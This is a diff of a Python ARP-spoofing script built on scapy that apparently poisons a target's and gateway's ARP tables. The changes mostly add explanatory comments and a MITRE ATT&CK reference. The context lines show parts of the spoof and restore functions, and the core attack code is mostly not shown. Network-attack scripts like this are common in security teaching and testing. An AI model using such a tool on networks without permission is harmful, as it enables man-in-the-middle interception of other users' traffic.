@@ -1,5 +1,9 @@
 #!/usr/bin/env python3
+# Python3 script for ARP Spoofing a targeted IP or local network
+# Reference https://attack.mitre.org/techniques/T1557/002/ for more information on ARP Poisoning and threat actor groups leveraging this technique
+# Requires root/admin privileges on the device
 
+#imports
 import scapy.all as scapy
 import time
 import optparse
@@ -11,10 +15,8 @@ def get_arguments():
     parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP address")
     (options, arguments) = parser.parse_args()
     if not options.target:
-        #code to handle error
         parser.error("[-] Please specify a target. Use --help for more info.")
     elif not options.gateway:
-        #code to handle error
         parser.error("[-] Please specify the gateways IP address. Use --help for more info.")
     return options
 
@@ -42,7 +44,7 @@ def spoof(target_ip, spoof_ip):
     #Send the packet
     scapy.send(packet, verbose=False)
 
-#Restore the ARP table back to normal
+#Restore the ARP table
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
